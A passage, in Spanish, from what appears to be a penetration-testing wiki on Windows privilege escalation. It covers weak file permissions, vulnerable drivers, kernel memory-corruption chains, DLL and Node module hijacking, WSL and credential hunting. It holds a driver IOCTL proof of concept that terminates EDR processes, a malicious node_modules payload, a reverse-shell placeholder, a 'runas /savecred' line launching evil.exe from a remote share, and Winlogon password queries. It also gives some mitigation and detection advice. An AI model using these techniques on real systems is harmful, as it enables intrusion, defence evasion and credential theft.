## Archivos de entrada auxiliares de Windows Driver Kit en tareas programadas

El Windows Driver Kit opcional incluye `StandaloneRunner.exe`, que puede utilizar los archivos `command.txt`, `reboot.rsf` y `working\rsf.rsf` del proyecto desde su directorio de ejecución. Una tarea programada o un servicio que inicie este helper con una cuenta privilegiada puede convertir el acceso de escritura de un usuario con pocos privilegios a esos archivos de entrada en ejecución de comandos en el contexto de dicha cuenta, incluso si el ejecutable del helper está protegido. Confirma que el consumidor tiene privilegios y que **ambos** archivos auxiliares se pueden crear o modificar; encontrar solo el helper no es suficiente.

En una tarea programada, revisa su [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) y las ACL de las dos rutas de los archivos auxiliares. Si la tarea no especifica un directorio de trabajo, el directorio del ejecutable es solo una pista que hay que verificar, no una prueba de dónde lee la tarea sus archivos de entrada. También debe cumplirse el requisito del archivo de trabajo del proyecto. Comprueba la cuenta real de la tarea en lugar de asumir que se ejecuta como SYSTEM.

## Aplicaciones

### Aplicaciones instaladas

Comprueba los **permisos de los binarios** (quizá puedas sobrescribir uno y escalar privilegios) y de las **carpetas** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ruta de reparación del agente de Windows de Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) afecta a versiones anteriores de los agentes de Windows de Checkmk que escribían archivos de comandos en `C:\Windows\Temp` y luego ejecutaban un archivo protegido contra escritura preexistente si fallaba el reemplazo. El proveedor corrigió el problema en 2.1.0p40, 2.2.0p23, 2.3.0b1 y 2.4.0b1. Comprueba el nivel completo del parche instalado y si se puede ejecutar la operación afectada del agente; una etiqueta que solo indica la rama, como `2.1`, no permite determinar si existe exposición. La enumeración puede inspeccionar la versión, el estado del servicio y los permisos de Temp sin crear archivos ni activar comandos del agente.

#### Revisión del servicio SAML de ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) afectaba a ADSelfService Plus, versión build 6210 y anteriores; el proveedor lo corrigió en la build 6211. Solo es relevante si SAML SSO **está o estuvo** habilitado. Por tanto, una entrada de producto instalado o una ruta del servicio es un indicio, no una confirmación de vulnerabilidad: confirma la build exacta, el historial de configuración de SAML, la accesibilidad del servicio desde la red y la cuenta con la que se ejecuta. La ejecución de código a través del servicio hereda los privilegios de esa cuenta; para ejecutar como SYSTEM, la instancia debe ejecutarse como SYSTEM. Un archivo `OfflineBackup_*.ezip` legible en el directorio Backup del producto es un indicio independiente de que existe una copia de seguridad cifrada, no una prueba de que contenga credenciales utilizables ni de esta vulnerabilidad de SAML. Durante la enumeración rutinaria, registra su ruta y permisos de acceso sin descomprimirlo.

#### Límites entre el controlador de Jenkins y las cuentas de dominio

En un controlador de Jenkins en Windows, distingue entre el permiso para crear o configurar un job y el permiso para iniciarlo: [Jenkins documenta estos permisos por separado como `Job/Create`, `Job/Configure` y `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Una programación configurada o un activador remoto pueden ofrecer otra vía para ejecutar una build, pero confirma que esté habilitada y que la build realmente se ejecute. La ejecución utiliza la identidad del controlador o del agente seleccionado, y una credencial almacenada solo se puede usar si el job tiene acceso a su ámbito. Por separado, inspecciona el acceso a los metadatos de `JENKINS_HOME`: Jenkins almacena material de credenciales y claves de cifrado en `credentials.xml`, `secrets/hudson.util.Secret` y `secrets/master.key` ([almacenamiento de secretos de Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Su mera presencia no revela una contraseña; verifica el **acceso de lectura a los archivos necesarios** y una vía independiente para reutilizar la cuenta, sin imprimir secretos en resultados compartidos. Si esa cuenta tiene permiso de escritura `scriptPath` en un objeto de usuario de AD, confirma que la ruta del script sea escribible y que exista un proceso de inicio de sesión o consumidor programado que se ejecute como el usuario de destino antes de considerarlo una ejecución entre usuarios. Cualquier control adicional de grupos requiere verificar por separado los derechos efectivos de AD.

#### Identidad del agente autohospedado de Azure Pipelines

En un proyecto de Azure DevOps Server o Azure Pipelines, distingue entre el permiso para **crear o editar** una pipeline, el permiso para **ponerla en cola** y el permiso para usar el pool de agentes seleccionado; [Microsoft documenta por separado los permisos de pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) y la [autorización del pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Si una cuenta con menos privilegios puede enviar un paso de script y ejecutar esa pipeline en un agente autohospedado de Windows, el paso se ejecuta como la [cuenta del sistema operativo configurada para el agente](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Verifica la pipeline exacta, las restricciones de rama y recursos, el pool autorizado, que el job se pueda ejecutar y la identidad del servicio del agente antes de afirmar que existe una transición entre usuarios o a SYSTEM. Un agente instalado, un rol de proyecto o el permiso de escritura en un repositorio son solo indicios; revisa los permisos y los metadatos del servicio local sin iniciar una build durante la enumeración pasiva.

#### Credenciales de Microsoft Entra Connect Sync

[Microsoft distingue](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) la **cuenta de servicio de ADSync**, que ejecuta el servicio de sincronización y accede a su base de datos SQL, de la **cuenta del conector de AD DS**, cuyos permisos en el directorio dependen de las funciones de sincronización configuradas. Las credenciales del conector se almacenan cifradas en esa base de datos, y el material de claves está [protegido por DPAPI bajo la cuenta de servicio de ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). La mera existencia de un servicio de sincronización instalado, de un grupo cuyo nombre parezca indicar administración local o de visibilidad de la base de datos no demuestra que haya credenciales que se puedan descifrar ni una vía de escalada de dominio. Revisa por separado los permisos reales de lectura de la base de datos, el acceso a la cuenta de servicio y a las claves, la instalación y la configuración de SQL, la identidad del conector configurada y los privilegios efectivos de esa identidad en AD. La enumeración rutinaria debe mostrar solo metadatos del servicio y de acceso, no consultar ni imprimir los secretos almacenados.

#### Permisos de las DLL de soporte de controladores de impresora

Un controlador de impresora instalado puede guardar DLL de soporte en `C:\ProgramData` y cargarlas en un proceso de impresión con más privilegios. Revisa las ACL exactas del directorio del controlador y de las DLL, incluidos los directorios principales y los puntos de reanálisis, incluso si se deniega la enumeración de WMI de impresoras. Para el [problema del controlador de impresora Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), la ruta indicada era `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [la divulgación original](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) describe la carga de DLL por parte de `PrintIsolationHost.exe`. Una ACL escribible es solo un indicio: verifica el acceso efectivo de escritura después de aplicar las entradas de denegación, que el controlador correspondiente esté instalado y cargue el archivo con una identidad privilegiada, y si el controlador actualizado o el programa de seguridad del proveedor corrigieron la instalación. No deduzcas que existe una vulnerabilidad solo por el nombre del directorio o la versión del controlador.

### Permisos de escritura

Comprueba si puedes modificar algún archivo de configuración para leer un archivo especial, o si puedes modificar algún binario que vaya a ejecutar una cuenta de Administrador (schedtasks).

Una forma de encontrar permisos débiles en carpetas o archivos del sistema es hacer lo siguiente:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistencia/ejecución mediante carga automática de plugins de Notepad++

Notepad++ carga automáticamente cualquier DLL de plugin que esté en sus subcarpetas `plugins`. Si hay una instalación portable/copia con permisos de escritura, colocar un plugin malicioso permite ejecutar código automáticamente dentro de `notepad++.exe` en cada inicio (incluidos `DllMain` y las devoluciones de llamada del plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Ejecutar al iniciar

**Comprueba si puedes sobrescribir algún registro o binario que vaya a ejecutar otro usuario.**\
**Lee** la **siguiente página** para obtener más información sobre las **ubicaciones interesantes de autoruns para escalar privilegios**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Busca posibles drivers **extraños/vulnerables de terceros**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Si un driver expone una primitiva arbitraria de lectura/escritura del kernel (algo común en handlers IOCTL mal diseñados), puedes escalar privilegios robando directamente un token de SYSTEM de la memoria del kernel.<sup>[[13]](#references)</sup> Consulta aquí la técnica paso a paso:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Material relacionado sobre explotación del kernel de Windows:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

En los errores de race condition en los que la llamada vulnerable abre una ruta del Object Manager controlada por el atacante, ralentizar deliberadamente la búsqueda (usando componentes con longitud máxima o cadenas profundas de directorios) puede ampliar la ventana de microsegundos a decenas de microsegundos:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF en colas cancel-safe, divulgaciones de paged-pool y pivotes de I/O ring

Algunas cadenas de LPE del kernel de Windows pueden construirse a partir de dos bugs individualmente débiles: una **race condition en el ciclo de vida de una cola cancel-safe** que libera una solicitud/CBD mientras el lock de la cola sigue retenido, y una divulgación por **liberación del lock antes de copiar** que filtra una asignación liberada de paged-pool durante `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Notas de auditoría y explotación:

- **Liberar mientras se retiene el lock + cancelar después**: busca una ruta de éxito que haga **Acquire -> CompleteRequest/free -> Release**, mientras que la ruta de cancelación hace **Acquire -> RemoveIo(pointer obsoleto) -> Release -> CompleteCanceledIo**. Si la ruta de éxito llega a `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` antes de liberar el lock de CBDQ/CSQ, un thread bloqueado en `NtCancelIoFileEx -> IopCsqCancelRoutine` puede reanudarse después y pasar un `PFLT_CALLBACK_DATA` liberado al callback de eliminación del driver.
- **Reclama el objeto de cola liberado** con una asignación de paged-pool del mismo tamaño controlada por el atacante. Las entradas de la cola de datos de `NPFS` son útiles porque la carga útil y el tamaño son controlables, y luego puedes examinarlas con operaciones de lectura/peek de pipe. Si el objeto liberado contiene enlaces de lista, sobrescríbelos con una **lista cíclica de nodos de solicitud falsos en memoria de usuario** para que el driver procese repetidamente estructuras de solicitud definidas por el atacante en vez de detenerse en la cabeza de lista original.
- **Mejora una escritura predecible**: si la solicitud falsa redirige un puntero de contexto anidado usado por escrituras de bookkeeping (marcas de tiempo / QPC / campos adyacentes al refcount), puedes obtener una escritura del kernel **con dirección controlada, pero valor no controlado**. En ese caso, apunta al campo **length/size** de un objeto rociado en el pool en vez de a un puntero final de código/datos, y luego enumera el spray hasta que el objeto dañado permita una **lectura fuera de límites de paged-pool**.
- **Patrón de divulgación vulnerable a race condition**: cualquier syscall que haga `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` es un candidato sólido. La fiabilidad mejora cuando el atacante puede ampliar el buffer copiado (por ejemplo, añadiendo muchas entradas de lista/recurso que aumenten el tamaño final de asignación de un serializador), porque una copia más larga amplía la ventana de reemplazo sin necesariamente bloquear la máquina.
- **Objetivos de relleno con muchos punteros**: los arrays de buffers registrados de Windows **I/O ring** son excelentes objetivos de divulgación porque su tamaño en paged-pool está controlado por el atacante (`8 * regBufferCnt`) y cada elemento es un puntero del kernel a un `_IOP_MC_BUFFER_ENTRY`. Filtra uno de estos arrays, recupera el `IORING_OBJECT` circundante y luego corrompe **`RegBuffers`** y **`RegBuffersCount`** para que las operaciones posteriores de I/O ring consuman entradas falsificadas por el atacante y proporcionen lectura/escritura arbitraria del kernel. Si la única escritura disponible te da un byte estable (por ejemplo, de `KUSER_SHARED_DATA+0x14`), usa **escrituras desalineadas solapadas** para construir un puntero de usuario de bytes repetidos como `0x0101010101010101`, asígnalo con `VirtualAlloc` y coloca allí el array de buffers registrados falsificado.<sup>[[30]](#references)</sup>

Indicadores útiles para la depuración:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Una vez que obtengas lectura/escritura arbitraria del kernel mediante el I/O ring corrupto, roba un token SYSTEM siguiendo el flujo de trabajo estándar posterior a la primitiva:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivas de corrupción de memoria de colmenas del Registro

Las vulnerabilidades modernas de las colmenas permiten preparar diseños deterministas, aprovechar descendientes escribibles de HKLM/HKU y convertir la corrupción de metadatos en desbordamientos del paged pool del kernel sin un driver personalizado. Aprende la cadena completa aquí:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusión de tipos en modo directo de `RtlQueryRegistryValues` a partir de rutas controladas por el atacante

Algunos drivers aceptan una ruta del Registro desde userland, solo validan que sea una cadena UTF-16 válida y luego llaman a `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` hacia un escalar de la pila, como `int readValue`. Si falta `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se interpreta según el tipo **real** del Registro, no según el tipo que esperaba el desarrollador.

Esto crea dos primitivas útiles:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: una ruta absoluta `\Registry\...` controlada por el usuario permite que el driver consulte claves elegidas por el atacante, revele su existencia mediante códigos de retorno o logs y, a veces, lea valores a los que el llamador no podría acceder directamente.
- **Corrupción de memoria del kernel**: un destino escalar como `&readValue` puede sufrir confusión de tipos y tratarse como un `REG_QWORD`, un `UNICODE_STRING` o un búfer binario de tamaño variable, según el tipo del valor del Registro.

Notas prácticas sobre la explotación:

- **Mitigación de Windows 8+**: si la consulta accede a una **colmena no confiable** con `RTL_QUERY_REGISTRY_DIRECT` pero sin `RTL_QUERY_REGISTRY_TYPECHECK`, los llamadores del kernel provocan un fallo `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Para mantener la posibilidad de explotación, busca **claves escribibles por el atacante dentro de colmenas del sistema confiables** en lugar de preparar valores bajo `HKCU`.
- **Preparación en una colmena confiable**: usa NtObjectManager para enumerar los descendientes escribibles de `\Registry\Machine` y vuelve a ejecutar el análisis con un token **de baja integridad** duplicado para encontrar claves accesibles desde contextos aislados:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: una escritura directa de 8 bytes en un `int` de 4 bytes corrompe datos adyacentes del stack y puede sobrescribir parcialmente un puntero de callback/función cercano.
- **`REG_SZ` / `REG_EXPAND_SZ`**: el modo directo espera que `EntryContext` apunte a un `UNICODE_STRING`. Si el código primero carga un `REG_DWORD` controlado por el atacante en un escalar del stack y luego reutiliza ese mismo búfer para leer una cadena, el atacante controla `Length`/`MaximumLength` e influye parcialmente en el puntero `Buffer`, lo que permite una escritura en el kernel parcialmente controlada.
- **`REG_BINARY`**: para datos binarios grandes, el modo directo trata el primer `LONG` en `EntryContext` como un tamaño de búfer con signo. Si una lectura previa de `REG_DWORD` deja un valor **negativo** controlado por el atacante en el escalar reutilizado, la siguiente consulta de `REG_BINARY` copia bytes del atacante directamente sobre slots adyacentes del stack, lo que suele ser la vía más sencilla para sobrescribir por completo el puntero de callback.

Patrón de búsqueda potente: **lecturas heterogéneas del registro en la misma variable del stack sin reinicializarla**. Busca `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, punteros `EntryContext` reutilizados y rutas de código donde la primera lectura del registro controla si se realiza una segunda lectura.

#### Abusar de la ausencia de FILE_DEVICE_SECURE_OPEN en objetos de dispositivo (LPE + eliminación de EDR)

Algunos drivers de terceros firmados crean su objeto de dispositivo con un SDDL sólido mediante IoCreateDeviceSecure, pero olvidan establecer FILE_DEVICE_SECURE_OPEN en DeviceCharacteristics. Sin este flag, la DACL segura no se aplica cuando se abre el dispositivo mediante una ruta que contiene un componente adicional, lo que permite que cualquier usuario sin privilegios obtenga un handle usando una ruta de espacio de nombres como:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (de un caso real)

Una vez que un usuario puede abrir el dispositivo, es posible abusar de los IOCTL privilegiados expuestos por el driver para obtener LPE y manipular el sistema. Capacidades observadas en casos reales:
- Devolver handles con acceso completo a procesos arbitrarios (robo de tokens / shell de SYSTEM mediante DuplicateTokenEx/CreateProcessAsUser).
- Lectura/escritura sin restricciones del disco en bruto (manipulación offline, trucos de persistencia durante el arranque).
- Terminar procesos arbitrarios, incluidos Protected Process/Light (PP/PPL), lo que permite eliminar AV/EDR desde userland mediante el kernel.

Patrón mínimo de PoC (modo usuario):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigaciones para desarrolladores
- Establece siempre FILE_DEVICE_SECURE_OPEN al crear objetos de dispositivo que deban estar restringidos por una DACL.
- Valida el contexto del caller para las operaciones privilegiadas. Añade comprobaciones de PP/PPL antes de permitir la terminación de procesos o la devolución de handles.
- Restringe los IOCTL (máscaras de acceso, METHOD_*, validación de entradas) y considera modelos con broker en lugar de privilegios directos del kernel.

Ideas de detección para defensores
- Supervisa las aperturas desde user mode de nombres de dispositivos sospechosos (p. ej., \\ .\\amsdk*) y secuencias específicas de IOCTL que indiquen abuso.
- Aplica la lista de bloqueo de controladores vulnerables de Microsoft (HVCI/WDAC/Smart App Control) y mantén tus propias listas de permitidos y bloqueados.


## PATH DLL Hijacking

Si tienes **permisos de escritura dentro de una carpeta presente en PATH**, podrías secuestrar una DLL cargada por un proceso y **escalar privilegios**.<sup>[[2]](#references)</sup>

Comprueba los permisos de todas las carpetas dentro de PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Para obtener más información sobre cómo abusar de esta comprobación:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Esta es una variante de **Windows uncontrolled search path** que afecta a aplicaciones **Node.js** y **Electron** cuando realizan una importación sin ruta, como `require("foo")`, y el módulo esperado **no está presente**.<sup>[[20]](#references)</sup>

Node resuelve paquetes recorriendo el árbol de directorios hacia arriba y comprobando las carpetas `node_modules` de cada directorio padre. En Windows, ese recorrido puede llegar a la raíz de la unidad, por lo que una aplicación iniciada desde `C:\Users\Administrator\project\app.js` puede terminar buscando en:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Si un **usuario con pocos privilegios** puede crear `C:\node_modules`, puede colocar un `foo.js` malicioso (o una carpeta de paquete) y esperar a que un **proceso Node/Electron con más privilegios** intente resolver la dependencia que falta. La carga útil se ejecuta en el contexto de seguridad del proceso víctima, por lo que esto se convierte en **LPE** cuando el objetivo se ejecuta como administrador, desde una tarea programada elevada o un contenedor de servicio, o desde una aplicación de escritorio privilegiada que se inicia automáticamente.

Esto es especialmente común cuando:

- una dependencia se declara en `optionalDependencies`<sup>[[22]](#references)</sup>
- una biblioteca de terceros incluye `require("foo")` en un bloque `try/catch` y continúa si falla
- se eliminó un paquete de las compilaciones de producción, se omitió durante el empaquetado o no se pudo instalar
- el `require()` vulnerable se encuentra en lo profundo del árbol de dependencias, en lugar de en el código principal de la aplicación

### Búsqueda de objetivos vulnerables

Usa **Procmon** para comprobar la ruta de resolución:<sup>[[23]](#references)</sup>

- Filtra por `Process Name` = ejecutable objetivo (`node.exe`, el EXE de la aplicación Electron o el proceso contenedor)
- Filtra por `Path` `contains` `node_modules`
- Céntrate en `NAME NOT FOUND` y en la apertura final correcta en `C:\node_modules`

Patrones de revisión de código útiles en archivos `.asar` desempaquetados o en el código fuente de la aplicación:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Explotación

1. Identifica el **nombre del paquete faltante** mediante Procmon o una revisión del código fuente.
2. Crea el directorio de búsqueda raíz si aún no existe:

```powershell
mkdir C:\node_modules
```

3. Coloca un módulo con el nombre exacto esperado:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Activa la aplicación víctima. Si la aplicación intenta ejecutar `require("foo")` y el módulo legítimo no está presente, Node puede cargar `C:\node_modules\foo.js`.

Algunos ejemplos reales de módulos opcionales ausentes que encajan con este patrón son `bluebird` y `utf-8-validate`, pero la **técnica** es lo reutilizable: encuentra cualquier **bare import ausente** que un proceso privilegiado de Windows Node/Electron vaya a resolver.

### Ideas para la detección y el hardening

- Genera una alerta cuando un usuario cree `C:\node_modules` o escriba allí nuevos archivos/paquetes `.js`.
- Busca procesos de alta integridad que lean desde `C:\node_modules\*`.
- Incluye todas las dependencias de runtime en producción y audita el uso de `optionalDependencies`.
- Revisa el código de terceros en busca de patrones silenciosos como `try { require("...") } catch {}`.
- Desactiva las comprobaciones opcionales cuando la biblioteca lo permita (por ejemplo, algunas implementaciones de `ws` pueden evitar la comprobación heredada de `utf-8-validate` con `WS_NO_UTF_8_VALIDATE=1`).

## Red

### Recursos compartidos

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### archivo hosts

Comprueba si hay otros equipos conocidos codificados de forma fija en el archivo hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfaces de red y DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Puertos abiertos

Comprueba si hay **servicios restringidos** desde el exterior.

```bash
netstat -ano #Opened ports?
```

Para un listener local, correlaciona su PID con el propietario del proceso, la ruta del ejecutable y cualquier servicio o tarea programada que lo inicie. Un servicio de control remoto puede proporcionar acceso como su usuario de escritorio solo si sus controles de autenticación y comandos lo permiten. Una aplicación TCP personalizada que se ejecuta con una cuenta con privilegios superiores es un objetivo de análisis aparte: el listener y la ruta del binario son indicios pasivos, mientras que una vía autenticada de corrupción de memoria requiere analizar ese binario exacto y las entradas a las que puede acceder. Si parece que un puerto expuesto pertenece a un proceso del sistema, compáralo con [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) antes de atribuirle el servicio backend; una regla de reenvío, por sí sola, no demuestra que se pueda acceder al destino ni que sea vulnerable.

### Tabla de enrutamiento

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabla ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reglas de Firewall

[**Consulta esta página para ver comandos relacionados con Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar reglas, crear reglas, desactivar, desactivar...)**

Más[ comandos para enumerar la red aquí](../basic-cmd-for-pentesters.md#network)

### Subsistema de Windows para Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

El binario `bash.exe` también se puede encontrar en `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si obtienes el usuario root, puedes escuchar en cualquier puerto (la primera vez que uses `nc.exe` para escuchar en un puerto, aparecerá una ventana gráfica preguntando si se debe permitir `nc` en el firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Para iniciar fácilmente bash como root, puedes probar `--default-user root`

Puedes explorar el sistema de archivos de `WSL` en la carpeta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Tener `root` de Linux dentro de WSL no otorga por sí solo derechos de Administrador de Windows. Si la identidad actual de Windows puede leer el sistema de archivos de una distribución, revisa los archivos del historial del shell (incluido `/root/.bash_history`) en busca de comandos que puedan haber registrado credenciales; la escalada sigue requiriendo una cuenta válida con privilegios superiores y una vía de autenticación permitida. La estructura `LocalState\rootfs` corresponde a instalaciones antiguas de WSL; WSL 2 suele almacenar la distribución en un [disco virtual `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), así que primero identifica la distribución y la ruta de almacenamiento reales. Evita mostrar el contenido del historial durante la enumeración automatizada.

## Credenciales de Windows

### Credenciales de Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Trata `DefaultUserName` y `DefaultDomainName` como contexto de cuenta, no como credenciales. Un valor no vacío en `DefaultPassword` o `AltDefaultPassword` es un hallazgo de texto plano en el registro. Si `AutoAdminLogon=1`, pero no se puede leer ninguna contraseña en texto plano, eso es solo una pista: [Sysinternals Autologon puede almacenar la contraseña como un secreto de LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), y las lecturas normales del registro no permiten determinar si ese secreto existe o se puede recuperar. Revisa los derechos de acceso y la configuración real del inicio de sesión antes de informar de una exposición de credenciales.

### Administrador de credenciales / Windows Vault

De [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault almacena credenciales para servidores, sitios web y otros programas que **Windows** puede usar para **iniciar sesión automáticamente por los usuarios**. A primera vista, podría parecer que los usuarios pueden guardar credenciales de sitios como Facebook, Twitter o Gmail y hacer que los navegadores inicien sesión automáticamente, pero no funciona así.

Windows Vault almacena credenciales con las que Windows puede iniciar sesión automáticamente por los usuarios. Esto significa que cualquier **aplicación de Windows que necesite credenciales para acceder a un recurso** (servidor o sitio web) **puede usar este Administrador de credenciales** y Windows Vault, y utilizar las credenciales proporcionadas en lugar de que los usuarios introduzcan el nombre de usuario y la contraseña cada vez.

A menos que las aplicaciones interactúen con el Administrador de credenciales, no creo que puedan usar las credenciales de un recurso determinado. Por lo tanto, si tu aplicación quiere usar el vault, debería **comunicarse de algún modo con el administrador de credenciales y solicitar las credenciales de ese recurso** al vault de almacenamiento predeterminado.

Usa `cmdkey` para enumerar las credenciales almacenadas en el equipo.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Entonces puedes usar `runas` con la opción `/savecred` para usar las credenciales guardadas. El siguiente ejemplo ejecuta un binario remoto desde un recurso compartido SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Uso de `runas` con un conjunto de credenciales proporcionado.

```bash
